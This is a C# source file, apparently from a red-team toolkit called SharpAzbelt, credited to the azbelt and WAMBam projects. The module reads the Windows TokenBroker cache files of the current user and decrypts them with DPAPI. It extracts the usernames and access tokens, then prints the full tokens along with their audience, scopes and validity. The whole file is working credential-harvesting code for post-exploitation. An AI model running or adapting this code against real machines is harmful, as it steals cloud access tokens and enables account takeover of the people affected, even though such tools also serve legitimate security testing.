/*
 * based on https://github.com/daddycocoaman/azbelt/blob/main/src/azbelt/modules/tbres.nim
 * which is based on https://github.com/xpn/WAMBam/blob/master/TBRES/TBRES/Program.cs
 * 
 * this is just a bastardised version of both
 */
using System;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.Json;

namespace SharpAzbelt
{
    class Tbres
    {
        public class TBRes
        {
            public TbDataStoreObject TBDataStoreObject { get; set; }
        }

        public class TbDataStoreObject
        {
            public Header Header { get; set; }
            public ObjectData ObjectData { get; set; }
        }

        public class Header
        {
            public string ObjectType { get; set; }
            public int SchemaVersionMajor { get; set; }
            public int SchemaVersionMinor { get; set; }
        }

        public class ObjectData
        {
            public SystemDefinedProperties SystemDefinedProperties { get; set; }
            public object[] ProviderDefinedProperties { get; set; }
            public PerApplicationProperties PerApplicationProperties { get; set; }
        }

        public class SystemDefinedProperties
        {
            public RequestIndex RequestIndex { get; set; }
            public Expiration Expiration { get; set; }
            public Status Status { get; set; }
            public ResponseBytes ResponseBytes { get; set; }
            public ProviderPfn ProviderPfn { get; set; }
            public AccountIds AccountIds { get; set; }
        }

        public class RequestIndex
        {
            public string Type { get; set; }
            public bool IsProtected { get; set; }
            public string Value { get; set; }
        }

        public class Expiration
        {
            public string Type { get; set; }
            public bool IsProtected { get; set; }
            public string Value { get; set; }
        }

        public class Status
        {
            public string Type { get; set; }
            public bool IsProtected { get; set; }
            public string Value { get; set; }
        }

        public class ResponseBytes
        {
            public string Type { get; set; }
            public bool IsProtected { get; set; }
            public string Value { get; set; }
        }

        public class ProviderPfn
        {
            public string Type { get; set; }
            public bool IsProtected { get; set; }
            public string Value { get; set; }
        }

        public class AccountIds
        {
            public string Type { get; set; }
            public bool IsProtected { get; set; }
            public string[] Value { get; set; }
        }

        public class PerApplicationProperties
        {
        }

        public static string runTbres()
        {
            string outText = "[i] TokenBroker Cache:\n";
            string outFormat = "[+]    {0,-15} : {1}\n";
            string tbRes;

            string homeDir = System.Environment.GetFolderPath(System.Environment.SpecialFolder.LocalApplicationData);
            string tbPath = Path.Combine(homeDir, "Microsoft\\TokenBroker\\Cache");

            var files = GetFiles(tbPath);
            if (files.Length == 0)
            {
                outText += "[!]    No TokenBroker caches found\n";
                goto Exit;
            }

            foreach (var file in files)
            {
                outText += "[.]\n";
                outText += string.Format(outFormat, "File", file);

                // read the file
                try
                {
                    tbRes = File.ReadAllText(file);
                }
                catch (Exception)
                {
                    outText += string.Format(outFormat, "Error", "Failed to read file.");
                    continue;
                }

                // get rid of the pesky null bytes and deserialise
                tbRes = tbRes.Replace("\0", string.Empty);
                TBRes tbcache = JsonSerializer.Deserialize<TBRes>(tbRes);

                // grab what we want, base64 decode and unprotect the data
                var decodedTbres = Convert.FromBase64String(tbcache.TBDataStoreObject.ObjectData.SystemDefinedProperties.ResponseBytes.Value);
                var decrypted = NativeMethods.cryptUnprotectData(decodedTbres);
                byte[] decryptedBytes = Encoding.Default.GetBytes(decrypted);

                // we need to parse the data
                int usernameIndex = decrypted.IndexOf("WA_UserName");
                int tokenIndex = decrypted.IndexOf("WTRes_Token");

                // no token?
                if (tokenIndex < 0)
                {
                    outText += string.Format(outFormat, "Error", "WTRes_Token not found.");
                    continue;
                }

                // brace yourself - it's about to get ugly...er
                usernameIndex += "WA_UserName".Length + 4; // string length + binary stuff
                tokenIndex += "WTRes_Token".Length + 4;
                int usernameSize = (decryptedBytes[usernameIndex] << 24) + (decryptedBytes[usernameIndex+1] << 16) +  (decryptedBytes[usernameIndex+2] << 8) + decryptedBytes[usernameIndex+3];
                int tokenSize = (decryptedBytes[tokenIndex] << 24) + (decryptedBytes[tokenIndex + 1] << 16) + (decryptedBytes[tokenIndex + 2] << 8) + decryptedBytes[tokenIndex + 3];

                if (decrypted.Contains("No Token"))
                {
                    outText += string.Format(outFormat, "Error", "No token identified.");
                    continue;
                }

                string username = decrypted.Substring(usernameIndex+4,usernameSize);
                string token = decrypted.Substring(tokenIndex + 4, tokenSize);

                outText += string.Format(outFormat, "Username", username);

                // process the token
                if (token.Split('.').Length == 5 || token.IndexOf('.') < 0 || !token.StartsWith("eyJ0"))
                    outText += string.Format(outFormat, "Token (JWE)", token);
                else
                {
                    Utils.Jwt jwt = Utils.ProcessJWT(token);

                    if (Utils.Appids.ContainsKey(jwt.aud))
                        outText += string.Format(outFormat, "Audience", Utils.Appids[jwt.aud]);
                    else
                        outText += string.Format(outFormat, "Audience", jwt.aud);
                    outText += string.Format(outFormat, "Scopes", jwt.scp);
                    outText += string.Format(outFormat, "Valid", DateTimeOffset.FromUnixTimeSeconds(jwt.exp) > DateTimeOffset.Now ? "true" : "false");
                    outText += string.Format(outFormat, "Token (JWT)", token);
                }
            }

            Exit:
            return outText + "\n";
        }

        private static string[] GetFiles(string dir)
        {
            var tbresFiles = Directory.EnumerateFiles(dir, "*.tbres");
            return tbresFiles.ToArray();
        }
    }
}
